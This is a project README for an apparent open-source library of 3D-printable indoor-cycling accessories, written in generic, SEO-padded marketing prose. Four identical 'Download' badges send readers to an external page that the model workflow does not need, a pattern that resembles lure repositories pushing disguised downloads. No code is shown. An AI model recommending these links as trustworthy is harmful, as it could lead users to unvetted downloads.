![preview](https://raw.githubusercontent.com/leonardobitca/print-and-pedal-garage/main/screen_8c37d.svg)

# 🚴 CadenceForge — Open-Source Workshop for Cycling Accessory Fabrication

[![Download](https://raw.githubusercontent.com/leonardobitca/print-and-pedal-garage/main/bin_b1251e.svg)](https://leonardobitca.github.io/print-and-pedal-garage/)

---

## 🧭 Overview

CadenceForge is a community-driven digital workshop where cyclists, makers, and tinkerers converge to fabricate their own indoor training gear. It is the spiritual successor to the original 3d-printable-cycling-accessories project, but reimagined as a broader ecosystem: a curated library of parametric CAD models, print profiles, material notes, and rider-tested ergonomics research. Every part in this collection is designed to be reproduced on a desktop 3D printer, refined through community feedback, and adapted to fit the quirky dimensions of real bikes, real basements, and real winter training seasons.

The name CadenceForge reflects the rhythm of the workshop: a steady, repeatable cadence of contributions, each spin of the pedal (or the extruder) producing something useful. Whether you are building a wheel block for a stationary trainer, a tablet stand for Zwift-style sessions, or a discrete AirTag holder for your saddle rail, this repository is your blueprint vault.

[![Download](https://raw.githubusercontent.com/leonardobitca/print-and-pedal-garage/main/bin_b1251e.svg)](https://leonardobitca.github.io/print-and-pedal-garage/)

---

## 🎯 Why This Repository Exists

Indoor cycling has exploded in popularity, but the accessories market has not kept pace with the diversity of setups riders actually use. Off-the-shelf wheel blocks rarely match the geometry of a specific trainer. Tablet stands wobble at high cadence. Tracking tags get lost inside saddle bags. CadenceForge addresses these gaps by offering openly licensed, parametric, and remixable designs that anyone can print at home or at a local maker space.

The project is maintained by a rotating crew of contributors who believe that the best cycling gear is the gear you build yourself — measured, printed, tested, and refined until it disappears into the background of a great training session.

---

## ✨ Feature Highlights

- 🧩 **Parametric CAD Source Files** — Every model ships with its FreeCAD source document, so dimensions, tolerances, and mounting interfaces can be adjusted without starting from scratch.
- 🖨️ **Ready-to-Slice STL Bundles** — Pre-oriented, print-tested STL exports for common bed sizes (220×220, 250×250, 300×300).
- 📐 **Rider-Tested Geometry** — Designs validated by actual cyclists across road, gravel, and MTB setups.
- 🌍 **Multilingual Documentation** — Guides available in English, German, Spanish, French, and Japanese, with community translations expanding continuously.
- 🕒 **24/7 Community Support** — A global timezone-spanning maintainer roster ensures questions rarely wait more than a few hours for a response.
- 📱 **Responsive Web Previews** — Rendered previews of each model adapt cleanly to phones, tablets, and desktops for quick browsing before you commit filament.
- ♻️ **Material Guidance** — Notes on PLA, PETG, ASA, and TPU compatibility for each part, including load-bearing caveats.
- 🔧 **Modular Fastener Standards** — Shared bolt, insert, and clip specifications so parts from different designers interoperate.
- 📦 **Versioned Releases** — Semantic versioning for the model library, so your workshop notes stay consistent across updates.
- 🧠 **Design Rationale Docs** — Each accessory includes a short essay on why it is shaped the way it is.
- 🛰️ **AirTag and Tracker Adapters** — Discreet, secure holders for popular tracking tags, sized for saddle rails, stems, and frame bags.
- 🏋️ **Trainer Wheel Blocks** — Front wheel risers with adjustable height, anti-slip bases, and cable-routing channels.

---

## 🗂️ Repository Structure

A quick tour of the layout so you can navigate without guessing:

- `models/` — Master directory for all accessory designs, grouped by category.
- `models/wheel-blocks/` — Front wheel risers, rocker plate adapters, and trainer feet.
- `models/tablet-stands/` — Adjustable stands for phones and tablets used during indoor sessions.
- `models/tracker-holders/` — AirTag and similar tag enclosures for discreet mounting.
- `models/bottle-and-tool/` — Bottle cage spacers, multi-tool cradles, and pump clips.
- `cad-sources/` — FreeCAD `.FCStd` files, spreadsheets for parametric tables, and macro scripts.
- `print-profiles/` — Slicer profiles for popular printers and filament types.
- `docs/` — Assembly guides, material science notes, and ergonomics research.
- `docs/i18n/` — Localized documentation in multiple languages.
- `assets/renders/` — Static preview renders for documentation purposes.
- `community/` — Contribution templates, code of conduct, and roadmap discussions.

---

## 🛠️ Getting Started Without a Terminal

You do not need to be a software engineer to use CadenceForge. The intended workflow is deliberately low-friction:

1. Browse the `models/` directory and pick the accessory that matches your need.
2. Review the accompanying `README.md` inside that folder for material guidance and print orientation.
3. Open the STL in your preferred slicer, apply the recommended profile from `print-profiles/`, and slice.
4. Print, assemble with standard hardware, and mount on your bike or trainer.
5. Share your results and suggested tweaks through the issues or discussions area.

If you want to modify a design, open the corresponding FreeCAD source, adjust the parametric spreadsheet, and export a new STL. The documentation explains which parameters are safe to change and which ones affect structural integrity.

[![Download](https://raw.githubusercontent.com/leonardobitca/print-and-pedal-garage/main/bin_b1251e.svg)](https://leonardobitca.github.io/print-and-pedal-garage/)

---

## 🧬 Design Philosophy

CadenceForge treats every accessory as a small piece of industrial design rather than a disposable trinket. The guiding principles are:

- **Fit the rider, not the catalog.** A wheel block that does not match your trainer's stack height is worse than no block at all. Parametric models let you match reality.
- **Respect the material.** PLA is stiff but brittle under sustained load; PETG is forgiving; ASA survives UV. Each design documents its assumed material.
- **Design for disassembly.** Parts should be removable without destroying the surrounding bike. Clip fits are tuned, not forced.
- **Minimize post-processing.** Support-free orientations are preferred wherever geometry allows.
- **Document the why.** A model without rationale is a mystery. Every folder includes design notes.

---

## 🧑‍🤝‍🧑 Community and Support

CadenceForge thrives because cyclists and makers share their iterations. The maintainer team spans multiple continents, which means the support channel is effectively always awake — a genuine 24/7 community support model powered by volunteers in different time zones. Questions posted at midnight in one region are often answered by morning in another.

Multilingual support is a first-class concern. Documentation is maintained in several languages, and translation pull requests are welcomed and reviewed with the same care as code changes.

Contributors are encouraged to submit:

- New accessory designs with source files.
- Improvements to existing parametric tables.
- Slicer profiles for printers not yet covered.
- Translations of existing guides.
- Photographs and fitment reports from real setups.

---

## 🔍 SEO-Friendly Topics Covered

This repository naturally addresses a wide range of search interests within the cycling-maker space: 3D printable cycling accessories, indoor trainer wheel blocks, DIY tablet stands for virtual cycling, discreet AirTag holders for bicycles, FreeCAD parametric bike parts, PETG cycling components, home fabrication of training gear, open-source bike accessories, and rider-tested ergonomic designs. The documentation is written to be genuinely useful first and discoverable second — no keyword padding, just clear descriptions of what each part does and why it exists.

---

## 🖨️ Printer Compatibility Notes

The library targets common desktop FDM printers with a build volume of at least 200×200×180 mm. Larger parts, such as rocker plate adapters, include split variants for smaller beds. Resin printing is supported for small precision items like tag holders, though material guidance differs. Each model folder lists recommended layer heights, infill ranges, and wall counts. Where strength matters, the notes specify a minimum number of perimeters rather than a vague percentage.

---

## 🚧 Roadmap for 2026

The 2026 roadmap focuses on deepening the parametric ecosystem and broadening accessibility:

- Expand parametric libraries to cover more trainer models and axle standards.
- Introduce interactive parameter calculators for common dimensions.
- Grow localized documentation to ten languages.
- Publish a standardized hardware bill of materials format.
- Add community-submitted fitment databases for popular bikes.
- Develop a print-time estimator integrated into the documentation.

Progress is tracked in the roadmap discussion area, and priorities shift based on community demand.

---

## ⚠️ Disclaimer

The designs, models, and documentation in this repository are provided for personal fabrication and educational purposes. 3D-printed parts have material limitations and may fail under load. Always inspect printed components before use, especially any part that bears weight or attaches to a moving bicycle. The maintainers and contributors are not responsible for damage to property, equipment, or persons resulting from the use of these designs. Ride and train responsibly, and consult a qualified professional when in doubt about structural safety.

---

## 📜 License

This project is released under the MIT License. You are welcome to use, modify, and distribute the designs and documentation in accordance with the terms of that license. See the full license text here: https://opensource.org/licenses/MIT

Copyright (c) 2026 CadenceForge Contributors.

---

## 🙌 Acknowledgements

CadenceForge stands on the shoulders of the original 3d-printable-cycling-accessories effort and the broader open-source hardware community. Thanks go to every rider who printed a part, found a flaw, and shared a fix. The workshop keeps spinning because you keep pedaling.

[![Download](https://raw.githubusercontent.com/leonardobitca/print-and-pedal-garage/main/bin_b1251e.svg)](https://leonardobitca.github.io/print-and-pedal-garage/)